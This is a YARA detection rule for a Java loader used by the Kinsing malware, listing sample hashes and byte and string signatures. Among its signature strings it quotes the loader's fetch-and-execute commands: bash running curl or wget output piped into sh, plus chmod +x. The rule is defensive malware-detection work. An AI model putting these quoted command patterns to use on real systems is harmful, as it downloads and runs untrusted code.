rule ARKBIRD_SOLG_Loader_JAVA_Kinsing_Aug_2020_Variant_A_1: FILE {
  meta:
    description = "Detect Kinsing Variant A"
    author      = "Arkbird_SOLG"
    id          = "470fd4a6-faba-52b5-8ffa-5ac33fb607a0"
    date        = "2020-08-28"
    modified    = "2020-08-29"
    reference   = "https://twitter.com/JAMESWT_MHT/status/1299222198574632961"
    source_url  = "https://github.com/StrangerealIntel/DailyIOC/blob/a873ff1298c43705e9c67286f3014f4300dd04f7/2020-08-28/Loader_JAVA_Kinsing_Aug_2020_1.yar#L2-L30"
    license_url = "N/A"
    logic_hash  = "a9654b67ca6fb5de23d385707f01196d6d1c85e527d2bdbe312a2b2fcf998dc0"
    score       = 75
    quality     = 67
    tags        = "FILE"
    hash1       = "22063638b9f05870e14110ccab9e07d744204360b184cfec0075f9fd27e08488"
    hash2       = "248dd35d069d6b106b7528e41f95cd8cef0140fbb60808aa51c99ac117cf3318"
    hash3       = "6ec5b8ea86d0af908182d6afc63c85a817e0612dba6e5e4b126b5639ab048b16"
    hash4       = "b82d9e0ea2b6139438ce0b805fb03c3ae89ada9d4fdd7722562e6075f706048c"

  strings:
    $ClassCode1 = { 4c 69 66 45 78 70 2e 6a 61 76 61 0c 00 3f 00 40 }
    $ClassCode2 = "java/lang/StringBuilder" fullword ascii
    $ClassCode3 = "java/net/URL" fullword ascii
    $ClassCode4 = "java/net/URLConnection" fullword ascii
    $ClassCode5 = { 6a 61 76 61 2f 6c 61 6e 67 2f 50 72 6f 63 65 73 73 42 75 69 6c 64 65 72 01 00 02 2e 2f }
    $Com1       = "Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", \"curl \" + s + \"|sh\" }"
    $Com2       = "Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", \"wget -q -O - \" + s + \"|sh\" }"
    $Com3       = "chmod +x " fullword ascii
    $Com4       = { 53 4b 4c 01 00 02 6c 66 }
    $s1         = "User-Agent" fullword ascii
    $s2         = "kinsing" fullword ascii
    $s3         = "os.name"
    $s4         = "getAbsolutePath" fullword ascii
    $s5         = "openConnection"

  condition:
    filesize < 1KB and 4 of ($ClassCode*) and 3 of ($Com*) and 3 of ($s*)
}